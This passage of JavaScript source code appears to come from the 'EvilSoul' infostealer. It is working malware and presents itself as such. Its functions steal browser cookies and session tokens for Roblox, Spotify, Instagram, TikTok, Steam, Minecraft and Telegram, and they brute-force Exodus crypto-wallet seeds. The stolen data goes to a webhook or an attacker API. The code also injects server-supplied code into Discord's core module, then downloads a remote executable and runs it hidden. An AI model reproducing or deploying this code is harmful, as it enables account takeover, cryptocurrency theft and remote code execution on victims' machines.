          icon_url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg?ex=6803f643&is=6802a4c3&hm=7ffbcec6120b81e0071737fe156663a9cae6d66906fe200a4da42a41e26575f2&",
        },
      },
    ],
  };
  await axios.post(`http://${config.api}/send-embed`, payload);
}

async function GetSpotify(cookie) {
  try {
    const headers = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
      Cookie: `sp_dc=${cookie}`,
    };

    const response = await axios
      .get("https://www.spotify.com/api/account-settings/v1/profile", { headers })
      .then((res) => res.data)
      .catch(() => null);

    if (!response || !response.profile) return;

    const profile = response.profile;
    const email = profile.email || "Not available";
    const birthdate = profile.birthdate || "Not available";
    const country = profile.country || "Not available";
    const username = profile.username || "Not available";

    const embed = {
      color: 0x2b2d31,
      author: {
        name: "Spotify Account",
        icon_url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg",
      },
      thumbnail: {
        url: "https://cdn.discordapp.com/attachments/1362858586656608599/1362869105404936202/ab67616d0000b273eb4154a3d752e8e4514ef40d.jpg",
      },
      fields: [
        {
          name: "Cookie:",
          value: `\`\`\`${cookie || "Not found"}\`\`\``,
          inline: false,
        },
        {
          name: "Profile Url:",
          value: `[Click here](https://open.spotify.com/user/${username})`,
          inline: true,
        },
        {
          name: "Email:",
          value: `\`${email}\``,
          inline: true,
        },
        {
          name: "Birthdate:",
          value: `\`${birthdate}\``,
          inline: true,
        },
        {
          name: "Username:",
          value: `\`${username}\``,
          inline: true,
        },
        {
          name: "Country:",
          value: `\`${country}\``,
          inline: true,
        },
      ],
    };


    const payload = {
      key,
      embed,
    };

    await axios.post(`http://${config.api}/send-embed`, payload);
  } catch (err) {
    console.error("Erro ao enviar dados do Spotify:", err.message);
  }
}


function SaveCookies(cookiesByBrowser) {
  const temp = path.join(os.tmpdir(), identifier, "cookies");
  if (!fs.existsSync(temp)) fs.mkdirSync(temp, { recursive: true });
  for (const [browserName, profilesCookies] of Object.entries(cookiesByBrowser)) {
    let browserNameOfc = browserName === "undefined" ? "chrome" : browserName;
    for (const [profileName, cookies] of Object.entries(profilesCookies)) {
      const cookieFileName = path.join(temp, `${browserNameOfc}_${profileName}.txt`);
      const cookieStrings = cookies.map((cookie) => {
        if (cookie.name === ".ROBLOSECURITY") GetRoblox(cookie.value);
        if (cookie.domain.includes("instagram") && cookie.name.includes("sessionid")) GetInstagram(cookie.value);
        if (cookie.domain.includes(".tiktok.com") && cookie.name.includes("sessionid")) GetTikTok(cookie.value);
        if (cookie.domain.includes(".spotify.com") && cookie.name.includes("sp_dc")) GetSpotify(cookie.value);
        return `${cookie.domain}\tTRUE\t/\tFALSE\t2597573456\t${cookie.name}\t${cookie.value}`;
      }).join("\n");
      fs.writeFileSync(cookieFileName, cookieStrings);
    }
  }
  return temp;
}

async function ProcessBrowser(browser, cookiesByBrowser) {
  try {
    let profiles = fs.readdirSync(browser.user_data).filter((profile) =>
      profile.startsWith("Profile ") || profile === "Default"
    );

    if (browser.name === "opera_gx" && !profiles.includes("Default")) {
      profiles.push("Default");
    }

    let wsUrl;
    let cookies;

    for (const profile of profiles) {
      for (const port of ports) {
        try {
          CloseBrowsers(browser.bin);
          await StartOperaGX(browser.bin, browser.user_data, port);
          await StartBrowser(browser.bin, browser.user_data, port, profile);

          wsUrl = await WebSocketUrl(port);
          cookies = await ExtractCookies(wsUrl);

          if (!cookiesByBrowser[browser.name]) {
            cookiesByBrowser[browser.name] = {};
          }

          cookiesByBrowser[browser.name][profile] = cookies;

          await Sleep(2000);
          CloseBrowsers(browser.bin);
          break;
        } catch { }
      }
    }
  } catch { }
}


async function GetCookies() {
  try {
    const browsers = FindBrowsers();
    const cookiesByBrowser = {};
    if (browsers.length > 0) {
      for (const browser of browsers) {
        if (browser.name === "chrome") {


        } else {
          await ProcessBrowser(browser, cookiesByBrowser);
        }
      }

      if (Object.keys(cookiesByBrowser).length > 0) {
        const zipPath = SaveCookies(cookiesByBrowser);
        const cookiesPathEthernal = path.resolve(zipPath);
        return cookiesPathEthernal;
      }
    }
  } catch (err) {
    return null;
  }
}

async function SteamSession() {
  try {
    try {
      execSync("taskkill /IM Steam.exe /F");
    } catch (e) { }

    const steamPath = "C:\\Program Files (x86)\\Steam\\config";

    if (fs.existsSync(steamPath)) {
      const zipper = new AdmZip();
      zipper.addLocalFolder(steamPath);
      const temp = os.tmpdir();
      const target = join(temp, "steam_session.zip");
      zipper.writeZip(target);
      const link = await Upload(target);

      const loginFile = "C:\\Program Files (x86)\\Steam\\config\\loginusers.vdf";
      const accounts = fs.readFileSync(loginFile, "utf-8");
      const ids = accounts.match(/7656[0-9]{13}/g) || [];

      for (const account of ids) {
        try {
          const { data: { response: info } } = await axios.get(`https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids=${account}`);
          const { data: { response: games } } = await axios.get(`https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=${account}`);
          const { data: { response: level } } = await axios.get(`https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid=${account}`);

          const steam = `🤺 Profile: [Click here to profile!](${info.players[0].profileurl})`;
          const download = `🔍 Download: [Click here to download!](${link})`;

          const payload = {
            author: { name: `EvilSoul (Steam Session)`, icon_url: "https://i.pinimg.com/736x/7a/c7/16/7ac71692e22636c5167040f5623decb3.jpg" },
            description: `${steam}\n${download}`,
            fields: [{
              name: "<:auth:1316345705341911063> Steam Info", value:
                `> <:mencaoxx:1352260535357280377> **Username**: \`${info.players[0].personaname}\`\n` +
                `> <:xxxxww:1346711745170771978> **Steam ID**: \`${account}\`\n` +
                `> <:userrxs:1346717690609406004> **Level**: \`${level.player_level || "Private"}\`\n` +
                `> <:badges:1346713638106431519> **Games**: \`${games.game_count || "Private"}\`\n` +
                `> <:cxsjjdzx:1346714037630664714> **Created**: <t:${info.players[0].timecreated}:F>`, inline: false
            }],
            color: 0x2b2d31,
            footer: { text: `@evilsoulstealer | ${config.key}` },
            thumbnail: { url: `${info.players[0].avatarfull}` },
          };

          try {
            await axios.post(config.webhook, { embeds: [payload] }).catch(() => { });
            console.log("[STEAM] Embed enviada com sucesso.");
          } catch (error) {
            console.log("[STEAM] Erro ao enviar embed:", error.message);
          }

          await new Promise((resolve) => setTimeout(resolve, 2000));

        } catch (err) { }
      }
    }
  } catch (err) {
    console.log("[STEAM] Erro geral no SteamSession:", err.message);
  }
}


function McUserData() {
  const usercache = join(appdata, ".minecraft", "usercache.json");
  let userdata = [];
  if (fs.existsSync(usercache)) {
    const data = fs.readFileSync(usercache, "utf-8");
    userdata = JSON.parse(data);
  }
  return userdata;
}

async function MinecraftSession() {
  try {
    try {
      execSync("taskkill /IM javaw.exe /F");
    } catch (e) { }

    const home = os.homedir();
    const minecraft = join(appdata, ".minecraft");
    const lunar = join(home, ".lunarclient");
    const profiles = join(minecraft, "launcher_profiles.json");
    const accounts = join(lunar, "settings", "game", "accounts.json");

    const check = [profiles, accounts];
    const files = check.filter((file) => fs.existsSync(file));

    if (files.length > 0) {
      const temp = fs.mkdtempSync(join(os.tmpdir(), "minecraft-"));
      const tempmine = join(temp, "minecraft");
      DirectoryExistence(tempmine);

      for (const file of files) {
        const destination = join(tempmine, basename(file));
        DirectoryExistence(dirname(destination));
        fs.copyFileSync(file, destination);
      }

      const lunarsettings = join(lunar, "settings");
      const targetsettings = join(temp, "lunarclient", "settings");

      if (fs.existsSync(lunarsettings)) {
        await CopyFolder(lunarsettings, targetsettings);
      }

      const zipper = new AdmZip();
      zipper.addLocalFolder(temp);
      const target = join(os.tmpdir(), "minecraft_session.zip");
      zipper.writeZip(target);

      const link = await Upload(target);

      const user = McUserData();
      const fields = [];

      if (user.length > 0) {
        user.forEach((user) => {
          const { name, uuid, expiresOn } = user;
          const profile = `https://namemc.com/search?q=${uuid}`;
          const image = `https://mc-heads.net/skin/${uuid}`;
          let timestamp = null;

          try {
            timestamp = Math.floor(new Date(expiresOn).getTime() / 1000);
          } catch (e) { }

          fields.push({
            name: `<:auth:1316345705341911063> Informations`,
            value:
              `>>> <:mencaoxx:1352260535357280377> **Player:** \`${name}\`\n` +
              `<:xxxxww:1346711745170771978> **UUID:** \`${uuid}\`` +
              (timestamp ? `\n<:cxsjjdzx:1346714037630664714> **Expires:** <t:${timestamp}:F>` : '') +
              `\n<:userrxs:1346717690609406004> **Profile:** [Click here to profile!](${profile})` +
              `\n<:badges:1346713638106431519> **Skin:** [Click here to skin!](${image})`,
            inline: false,
          });
        });
      }

      const embed = {
        author: { name: `EvilSoul (Minecraft Session)`, icon_url: "https://i.pinimg.com/736x/7a/c7/16/7ac71692e22636c5167040f5623decb3.jpg" },
        description: `🔍 Download: [Click here to download!](${link})`,
        fields: [{ name: "<:auth:1316345705341911063> How to Use:", value: `>>> Download the file.\nNavigate to your Minecraft or Lunar Client folder.\nReplace the existing files with the ones in the ZIP.`, inline: false, }, ...fields,],
        color: 0x2b2d31,
        footer: { text: `@evilsoulstealer | ${config.key}` },
        thumbnail: { url: "https://i.pinimg.com/736x/33/ee/f5/33eef535b2ffa74da6a14c01834f2932.jpg" },
      };

      try {
        await axios.post(config.webhook, { embeds: [embed] }).catch(() => { });
        console.log("[MINECRAFT] Embed enviada com sucesso.");
      } catch (error) {
        console.log("[MINECRAFT] Erro ao enviar embed:", error.message);
      }

      fs.rmSync(temp, { recursive: true, force: true });
      fs.unlinkSync(target);
    }
  } catch (err) {
    console.log("[MINECRAFT] Erro geral no MinecraftSession:", err.message);
  }
}

async function CopyTelegram(src, dest, excludeFiles) {
  await fs.promises.mkdir(dest, { recursive: true });
  const files = await readdir(src);
  await Promise.all(
    files.map(async (file) => {
      const fullPath = join(src, file);
      const destPath = join(dest, file);

      try {
        const stats = await lstat(fullPath);
        if (stats.isDirectory()) {
          if ((file === "user_data" || file === "user_data#2") && excludeFiles.includes("media_cache")) {
            const subFiles = await readdir(fullPath);
            await Promise.all(
              subFiles.map(async (subFile) => {
                if (subFile !== "media_cache") {
                  const subFullPath = join(fullPath, subFile);
                  const subDestPath = join(destPath, subFile);
                  await fs.copy(subFullPath, subDestPath);
                }
              })
            );
          } else {
            await CopyTelegram(fullPath, destPath, excludeFiles);
          }
        } else {
          await fs.copy(fullPath, destPath);
        }
      } catch (err) { }
    })
  );
}

function TelegramZip(src, destZipPath) {
  return new Promise((resolve, reject) => {
    const output = fs.createWriteStream(destZipPath);
    const archive = archiver("zip", {
      zlib: { level: 9 },
    });

    output.on("close", () => {
      console.log("ZIP finalizado. Tamanho:", archive.pointer(), "bytes");
      resolve();
    });

    archive.on("error", (err) => {
      console.log("Erro ao zipar:", err.message);
      reject(err);
    });

    archive.pipe(output);
    archive.directory(src, "tdata");
    archive.finalize();
  });
}


async function TelegramSession() {
  try {
    console.log("Encerrando o processo do Telegram...");
    try {
      execSync("taskkill /IM Telegram.exe /F");
      console.log("Telegram encerrado com sucesso.");
    } catch {
      console.log("Não foi possível encerrar o Telegram (pode já estar fechado).");
    }

    await Sleep(3000);

    const tdataPath = join(appdata, "Telegram Desktop", "tdata");
    const zipTarget = join(localappdata, "telegram_session.zip");

    console.log("Compactando pasta tdata completa...");
    console.log("Origem:", tdataPath);
    console.log("Destino:", zipTarget);
    await TelegramZip(tdataPath, zipTarget);

    console.log("Fazendo upload do arquivo ZIP...");
    const link = await Upload(zipTarget);
    if (link) {
      console.log("Upload concluído. Link:", link);

      const embed = {
        author: { name: "EvilSoul (Telegram Session)", icon_url: "https://i.pinimg.com/736x/7a/c7/16/7ac71692e22636c5167040f5623decb3.jpg" },
        description: "-# Information obtained from the victim's machine",
        fields: [{ name: "<:auth:1316345705341911063> Telegram Link:", value: `Download: [Click here to download!](${link})`, inline: false }],
        color: 0x2b2d31,
        footer: { text: `@evilsoulstealer`, },
        thumbnail: { url: "https://i.pinimg.com/736x/b7/9e/03/b79e039ff0fcce5cbf61708afed57bb2.jpg" },
      };

      const data = { key: config.key, embed: embed, };

      try {
        console.log("Enviando embed para a API...");
        await axios.post(`http://${config.api}/send-embed`, data);
        console.log("Embed enviado com sucesso.");
      } catch (error) {
        console.log("Erro ao enviar embed:", error.message);
      }
    } else {
      console.log("Falha ao obter link de upload.");
    }

    console.log("Removendo ZIP temporário...");
    fs.unlinkSync(zipTarget);
    console.log("Limpeza concluída.");
  } catch (err) {
    console.log("Erro na função TelegramSession:", err);
  }
}

async function GetFirefox() {
  const cookiesList = [];
  const firefoxPaths = [
    { name: "Firefox", dir: path.join(process.env.APPDATA, "Mozilla", "Firefox", "Profiles") },
    { name: "Waterfox", dir: path.join(process.env.APPDATA, "Waterfox", "Profiles") }
  ];

  const tempPath = path.join(process.env.TEMP, identifier, "cookies");
  if (!fs.existsSync(tempPath)) fs.mkdirSync(tempPath, { recursive: true });

  for (const browser of firefoxPaths) {
    const { name: browserName, dir: baseDir } = browser;

    if (!fs.existsSync(baseDir)) continue;

    const profiles = fs.readdirSync(baseDir).filter(folder => {
      const fullPath = path.join(baseDir, folder);
      return fs.existsSync(path.join(fullPath, "cookies.sqlite"));
    });

    if (profiles.length === 0) continue;

    for (let i = 0; i < profiles.length; i++) {
      const profile = profiles[i];
      const profilePath = path.join(baseDir, profile, "cookies.sqlite");

      try {
        const db = new sqlite3.Database(profilePath);
        const allAsync = promisify(db.all).bind(db);

        let rows = [];
        try {
          rows = await allAsync("SELECT * FROM moz_cookies");
        } catch (e) { }

        db.close();

        const cookies = rows.map(row => {
          return `${row.host}\t${row.host.startsWith(".") ? "TRUE" : "FALSE"}\t${row.path}\t` +
            `${row.isSecure ? "TRUE" : "FALSE"}\t${row.expiry}\t${row.name}\t${row.value}`;
        });

        if (cookies.length > 0) {
          const fileName = `${browserName}_${i === 0 ? "Default" : `Profile ${i}`}.txt`;
          const outputPath = path.join(tempPath, fileName);
          fs.writeFileSync(outputPath, cookies.join("\n"), "utf-8");

          cookiesList.push({ path: outputPath, cookies });
          console.log(`[${browserName.toUpperCase()}] ${cookies.length} cookies salvos em:\n${outputPath}`);
        }
      } catch (err) {
        console.log(`[${browserName.toUpperCase()}] Erro ao processar ${profile}:`, err);
      }
    }
  }

  if (cookiesList.length === 0) {
    console.log("[FIREFOX] Nenhum cookie encontrado.");
    return { cookies: [] };
  }

  return cookiesList;
}

const wordlist = join(os.tmpdir(), "X7G8JQW9LFH3YD2KP6ZTQ4VMX5N8WB1RHFJQ.txt");
const defaultpass = [
  "1234",
  "12345",
  "123456",
  "12345678",
  "123456789",
  "password",
  "admin",
  "root",
  "qwerty",
  "abc123",
  "letmein",
  "welcome",
  "1234567",
  "passw0rd",
  "1234567890",
  "1q2w3e4r",
  "sunshine",
  "iloveyou",
  "football",
  "monkey",
  "superman",
  "hunter2",
  "dragon",
  "baseball",
  "shadow",
  "trustno1",
  "password1",
  "master",
  "login",
  "qazwsx",
  "starwars",
  "654321",
  "access",
  "123qwe",
  "zaq12wsx",
  "1qaz2wsx",
  "hello123",
  "batman",
  "charlie",
  "letmein123",
  "mustang",
  "696969",
  "michael",
  "freedom",
  "secret",
  "abc12345",
  "loveyou",
  "whatever",
  "trustme",
  "666666",
];

function BruteForce() {
  if (fs.existsSync(wordlist)) {
    const content = fs.readFileSync(wordlist, "utf-8");
    return content.split(/\r?\n/).filter(Boolean);
  } else {
    return defaultpass;
  }
}

function DecryptSeco(encrypted, passphrase) {
  try {
    return seco.decryptData(encrypted, passphrase);
  } catch (error) {
    return null;
  }
}

const tempPath = process.env.TEMP || os.tmpdir();
const cookiesFile = path.join(tempPath, identifier, "chrome", "Chrome", "Default", "cookies.txt");
const extraCookiesDir = path.join(tempPath, identifier, "cookies");

function readCookiesFromFile(filePath) {
  if (!fs.existsSync(filePath)) {
    return [];
  }

  const content = fs.readFileSync(filePath, "utf8");
  let cookies = [];

  const patterns = [
    /\.ROBLOSECURITY[^=]*=([^\s;]+)/gi,
    /ROBLOSECURITY\s+([^\s]+)/gi,
    /(roblosecurity[^:]*:\s*)([^\s]+)/gi,
    /(_\|WARNING[^\s"]+)/gi
  ];

  for (const pattern of patterns) {
    let match;
    while ((match = pattern.exec(content)) !== null) {
      let cookieValue = match[1] || match[2];
      if (cookieValue) {
        cookieValue = cookieValue.replace(/^"+|"+$/g, '').trim();

        if (
          cookieValue.length > 500 &&
          cookieValue.startsWith("_|WARNING") &&
          !cookies.includes(cookieValue)
        ) {
          cookies.push(cookieValue);
          console.log(`[INFO] Found Roblox cookie in ${path.basename(filePath)}: ${cookieValue.substring(0, 60)}...`);
        }
      }
    }
  }

  return cookies;
}

function readCookiesFromExtraDir() {
  let cookies = [];
  if (!fs.existsSync(extraCookiesDir)) return cookies;

  const files = fs.readdirSync(extraCookiesDir).filter(f => f.endsWith(".txt"));
  for (const file of files) {
    const filePath = path.join(extraCookiesDir, file);
    cookies.push(...readCookiesFromFile(filePath));
  }
  return cookies;
}

async function FindRoblox(cookie) {
  const headers = {
    Cookie: `.ROBLOSECURITY=${cookie}`,
    "User-Agent": "Roblox/WinInet",
  };

  try {
    const resp = await axios.get("https://users.roblox.com/v1/users/authenticated", { headers });
    if (!resp?.data) return null;

    let robux = 0;
    try {
      const balance = await axios.get("https://economy.roblox.com/v1/user/currency", { headers });
      robux = balance?.data?.robux || 0;
    } catch {
      console.log("[WARN] Não foi possível obter saldo de Robux");
    }

    return {
      id: resp.data.id,
      username: resp.data.name,
      displayName: resp.data.displayName,
      robux
    };
  } catch (err) {
    console.log("[ERROR] Roblox request falhou:", err.response?.status || err.message);
    return null;
  }
}

async function embedRoblox(cookie) {
  const data = await FindRoblox(cookie);
  if (!data) {
    console.log("[INFO] Nenhum dado válido encontrado para o cookie");
    return;
  }

  const payload = {
    username: "EvilSoul",
    avatar_url: "https://i.pinimg.com/736x/7a/c7/16/7ac71692e22636c5167040f5623decb3.jpg",
    embeds: [
      {
        author: { name: `EvilSoul (Roblox Session)`, icon_url: "https://i.pinimg.com/736x/7a/c7/16/7ac71692e22636c5167040f5623decb3.jpg" },
        description: `\`\`\`${cookie}\`\`\``,
        fields: [
          {
            name: "<:auth:1316345705341911063> Roblox Info",
            value:
              `> <:mencaoxx:1352260535357280377> **Username**: \`${data.username || "Unknown"}\`\n` +
              `> <:userrxs:1346717690609406004> **Display Name**: \`${data.displayName || "Unknown"}\`\n` +
              `> <:xxxxww:1346711745170771978> **User ID**: \`${data.id || "Unknown"}\`\n` +
              `> <:badges:1346713638106431519> **Robux**: \`${data.robux || 0}\`\n` +
              `> <:cxsjjdzx:1346714037630664714> **Profile**: [Open Profile](https://www.roblox.com/users/${data.id}/profile)`,
            inline: false
          }
        ],
        color: 0x2b2d31,
        footer: { text: `@evilsoulstealer | ${config.key}` },
      }
    ]
  };

  try {
    await axios.post(config.webhook, payload, {
      headers: { "Content-Type": "application/json" }
    });
    console.log(`[SUCESS] Enviado para o webhook: ${data.username} | Robux: ${data.robux}`);
  } catch (err) {
    console.log("[ERROR] Falha ao enviar pro webhook:", err.response?.data || err.message);
  }
}

async function SessionRoblox() {
  console.log("[INFO] Lendo cookies do arquivo fixo:", cookiesFile);

  let cookies = readCookiesFromFile(cookiesFile);
  console.log(`[SUCESS] Encontrados ${cookies.length} cookies no fixo`);

  console.log("[INFO] Lendo cookies da pasta extra:", extraCookiesDir);
  cookies.push(...readCookiesFromExtraDir());
  console.log(`[SUCESS] Total de cookies encontrados: ${cookies.length}`);

  for (const cookie of cookies) {
    await embedRoblox(cookie);
    await new Promise(r => setTimeout(r, 1000));
  }
}

async function ExodusSession() {
  try {
    const exodus = join(appdata, "Exodus", "exodus.wallet");
    const target = join(appdata, "exodus_session.zip");
    const seed = join(exodus, "seed.seco");

    if (fs.existsSync(seed)) {
      await ZipDirectory(exodus, target);
      const content = fs.readFileSync(seed);
      FileEncoding(content);

      const passwords = BruteForce();
      let found = null;
      let decrypted = null;

      for (let password of passwords) {
        decrypted = DecryptSeco(content, password);
        if (decrypted) {
          found = password;
          break;
        }
      }

      const link = await Upload(target);
      if (link) {
        const embed = {
          author: { name: `EvilSoul (Exodus Session and BruteForce)`, icon_url: "https://i.pinimg.com/736x/7a/c7/16/7ac71692e22636c5167040f5623decb3.jpg" },
          thumbnail: { url: "https://i.pinimg.com/736x/7e/61/24/7e6124f9cc9ebaca4cdf8870bb3df7d5.jpg" },
          description: "-# Information retrieved from the victim’s wallet.",
          fields: [
            { name: '<:auth:1316345705341911063> Password', value: `Password: \`${found || "No password found"}\``, inline: false },
            { name: '<:auth:1316345705341911063> Exodus Link', value: `Download: [Click here to download!](${link})`, inline: false }],
          color: 0x2b2d31,
          footer: { text: `@evilsoulstealer | ${config.key}` }
        };

        try {
          await axios.post(config.webhook, { embeds: [embed] }).catch(e => { });
          console.log("[EXODUS] Embed enviada com sucesso.");
        } catch (error) {
          console.log("[EXODUS] Erro ao enviar embed:", error.message);
        }
      }
    }
  } catch (err) {
    console.log("[EXODUS] Erro na função ExodusSession:", err.message);
  }
}

async function GetSpotify() {
  try {
    const tempDir = join(os.tmpdir(), identifier, "cookies");

    if (!fs.existsSync(tempDir)) {
      console.log("[x] Directory not found:", tempDir);
      return;
    }

    const files = fs.readdirSync(tempDir);

    for (const fileName of files) {
      const filePath = path.join(tempDir, fileName);

      if (!fs.statSync(filePath).isFile() || !fileName.endsWith(".txt")) continue;

      const content = fs.readFileSync(filePath, "utf8");
      const lines = content.split(/\r?\n/);
      let foundAny = false;

      for (const line of lines) {
        const parts = line.trim().split(/\s+/);
        if (parts.length >= 7 && parts[5] === "sp_dc") {
          const sp_dc = parts[6];
          foundAny = true;

          const headers = {
            "User-Agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
            Cookie: `sp_dc=${sp_dc}`,
          };

          const response = await axios
            .get("https://www.spotify.com/api/account-settings/v1/profile", {
              headers,
            })
            .then((res) => res.data)
            .catch(() => null);

          if (!response || !response.profile) {
            console.log("[x] Invalid or expired cookie.");
            continue;
          }

          const profile = response.profile;
          const email = profile.email || "Not available";
          const birthdate = profile.birthdate || "Not available";
          const country = profile.country || "Not available";
          const username = profile.username;

          const embed = {
            author: { name: "EvilSoul (Spotify Session)", icon_url: "https://i.pinimg.com/736x/7a/c7/16/7ac71692e22636c5167040f5623decb3.jpg", },
            description: "-# Information obtained from the victim's machine",
            fields: [
              { name: "<:auth:1316345705341911063> Cookie:", value: `\`\`\`fix\n${sp_dc}\`\`\``, inline: false },
              { name: "Profile Url:", value: username ? `[Click here](https://open.spotify.com/user/${username})` : "Username not available", inline: true, },
              { name: "Email:", value: `\`${email}\``, inline: true },
              { name: "Birthdate:", value: `\`${birthdate}\``, inline: true },
              { name: "Username:", value: username ? `\`${username}\`` : "Username not available", inline: true },
              { name: "Country:", value: `\`${country}\``, inline: true },],
            color: 0x2b2d31,
            footer: { text: `@evilsoulstealer` },
            thumbnail: {
              url: "https://i.pinimg.com/736x/e6/55/bf/e655bff3217dd6f575a275604b0ff7e1.jpg",
            },
          };

          const data = { key: config.key, embed: embed };
          try {
            await axios.post(`http://${config.api}/send-embed`, data, {
              headers: { "Content-Type": "application/json" },
            });
          } catch (error) {
            if (error.response) {
              console.log("[x] Error sending embed:",
                error.response.status,
                error.response.data
              );
            } else {
              console.log("[x] Error sending embed:", error.message);
            }
          }
        }
      }

      if (!foundAny) {
        console.log(`[!] No sp_dc found in ${fileName}`);
      }
    }
  } catch (err) {
    console.error("[x] General error:", err.message);
  }
}

async function KillDiscords() {
  exec('tasklist', (err, stdout) => {
    if (err) return console.error('Erro ao listar processos:', err);

    const executables = ['Discord.exe', 'DiscordCanary.exe', 'DiscordPTB.exe', 'DiscordDevelopment.exe'];

    for (const executable of executables) {
      if (stdout.includes(executable)) {
        exec(`taskkill /F /T /IM ${executable}`, (killErr, _, stderr) => {
          if (
            killErr &&
            !stderr.includes('not found') &&
            !stderr.includes('could not be terminated') &&
            !stderr.includes('no running instance')
          ) {
            console.error(`Erro ao matar ${executable}:`, killErr);
          }
        });

        if (executable.toLowerCase().includes('discord')) {
          const folder = executable.replace('.exe', '');
          const updatePath = path.join(localappdata, folder, 'Update.exe');

          exec(`"${updatePath}" --processStart ${executable}`, (startErr) => {
            if (startErr) {
              console.error(`Erro ao reiniciar ${executable}:`, startErr);
            }
          });
        }
      }
    }
  });
}


async function InjectDiscord() {
  await KillDiscords()
  try {
    if (!local || !roaming) {
      console.error('[INFO] Environment variables LOCALAPPDATA or APPDATA are not defined.');
      return;
    }

    const postData = { key: config.key };
    const response = await axios.post(`http://${config.api}/dcinjection-send`, postData, {
      headers: {
        'Content-Type': 'application/json',
      },
      responseType: 'text'
    });

    const finalCode = response.data;

    if (!finalCode || finalCode.length < 10) {
      console.error('[ERROR] Invalid response from API. Injection code is missing or empty.');
      return;
    }

    const dirs = await fsPromises.readdir(local);
    const discordPaths = dirs.filter(dirName => dirName.includes('cord'));

    if (discordPaths.length === 0) {
      console.log('[INFO] No Discord installation found. Skipping injection.');
      return;
    }

    for (const discordPath of discordPaths) {
      const discordDir = path.join(local, discordPath);
      const appDirs = (await fsPromises.readdir(discordDir)).filter(dirName => dirName.startsWith('app-'));
      appDirs.sort((a, b) => b.localeCompare(a, undefined, { numeric: true }));
      const appVersionPath = appDirs.length > 0 ? path.join(discordDir, appDirs[0]) : null;

      if (appVersionPath) {
        let discordType = 'Discord';
        if (discordPath.includes('Canary')) discordType = 'Canary';
        if (discordPath.includes('PTB')) discordType = 'PTB';

        try {
          const modulesPath = path.join(appVersionPath, 'modules');
          const dirs = await fsPromises.readdir(modulesPath);
          const coreDir = dirs.find(dirName => dirName.includes('discord_desktop_core'));

          if (coreDir) {
            const corePath = path.join(modulesPath, coreDir, 'discord_desktop_core');
            const indexPath = path.join(corePath, 'index.js');
            await fsPromises.writeFile(indexPath, finalCode, 'utf8');
            console.log(`[INFO] Injected code into ${indexPath}`);
            injectionPaths.push(indexPath);
            injectionResults.push({ path: indexPath, type: discordType });

            const dbPath = path.join(roaming, discordPath.replace(local, '').trim(), 'Local Storage', 'leveldb');
            const files = await fsPromises.readdir(dbPath);
            const ldbFiles = files.filter(file => file.endsWith('.ldb'));
            const logFiles = files.filter(file => file.endsWith('.log'));

            for (const ldbFile of ldbFiles) {
              const ldbFilePath = path.join(dbPath, ldbFile);
              await fsPromises.writeFile(ldbFilePath, '', 'utf8');
              console.log(`[INFO] Zeroed out token database file at ${ldbFilePath}`);
            }

            for (const logFile of logFiles) {
              const logFilePath = path.join(dbPath, logFile);
              await fsPromises.unlink(logFilePath);
              console.log(`[INFO] Deleted log file at ${logFilePath}`);
            }
          }
        } catch (error) {
          console.error(`[ERRO] Error injecting code into ${discordType}:`, error);
        }
      }
    }

    try {
      const betterDiscordPath = path.join(roaming, 'BetterDiscord', 'data', 'betterdiscord.asar');
      await fsPromises.writeFile(betterDiscordPath, finalCode, 'utf8');
      console.log(`[INFO] Injected code into BetterDiscord at ${betterDiscordPath}`);
      injectionPaths.push(betterDiscordPath);
      injectionResults.push({ path: betterDiscordPath, type: 'BetterDiscord' });
    } catch (error) {
      console.error('[INFO] Error injecting code into BetterDiscord:', error);
    }

  } catch (error) {
    console.error('[ERROR] An error occurred:', error);
  }
}

async function DownloadPanel() {
  try {
    console.log("[INCIANDO WEBPANEL] Iniciando download do painel...");
    await DownloadExe();
    console.log("[WEB PANEL] Download concluído. Abrindo o executável...");
    OpenExe(config.key);
  } catch (error) {
    console.error("[WEB PANEL] Erro:", error);
  }
}

const exe = `http://${config.api}/download/panel`;
const name = `evilsoul_${crypto.randomBytes(8).toString("hex")}.exe`;
const exepath = join(process.env.TEMP, name);

async function DownloadExe() {
  try {
    console.log(`[WEBPANEL] Baixando de: ${exe}`);
    const response = await axios({
      method: "get",
      url: exe,
      responseType: "stream",
    });

    const writer = fs.createWriteStream(exepath);
    await new Promise((resolve, reject) => {
      response.data.pipe(writer);
      writer.on("finish", () => {
        console.log(`[DOWNLOAD WEBPANEL] Download salvo em: ${exepath}`);
        resolve();
      });
      writer.on("error", (err) => {
        console.error("[DOWNLOAD EXE] Erro ao salvar:", err);
        reject(err);
      });
    });
  } catch (err) {
    console.error("[DOWNLOAD EXE] Erro:", err);
    throw err;
  }
}

function OpenExe(key) {
  const vbspath = join(process.env.TEMP, "open.vbs");
  const args = key || "";
  const content = `
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "${exepath}" & chr(34) & " ${args}", 0, False
`;

  fs.writeFile(vbspath, content, (err) => {
    if (err) {
      console.error("[OPEN EXE] Falha ao criar VBS. Usando BAT.");
      RunBat(exepath, args);
      return;
    }

    try {
      console.log("[OPEN EXE] Executando via VBS:", vbspath);
      execSync(`cscript "${vbspath}"`, {
        stdio: "inherit"
      });
    } catch (error) {
      console.warn("[OPEN EXE] Erro ao rodar VBS. Usando BAT.");
      RunBat(exepath, args);
    }
  });
}

function RunBat(filePath, args) {
  const bat = join(process.env.TEMP, "run.bat");
  const content = `"${filePath}" ${args}\r\n`;

  fs.writeFile(bat, content, (err) => {
    if (err) {
      console.error("[RUN BAT] Falha ao escrever BAT:", err);
      return;
    }

    try {
      console.log("[RUN BAT] Executando via BAT:", bat);
      execSync(`start "" "${bat}"`);
    } catch (error) {
      console.error("[RUN BAT] Falha ao executar BAT:", error);
    }
  });
}



async function rushwtf() {
  return new Promise((resolve, reject) => {
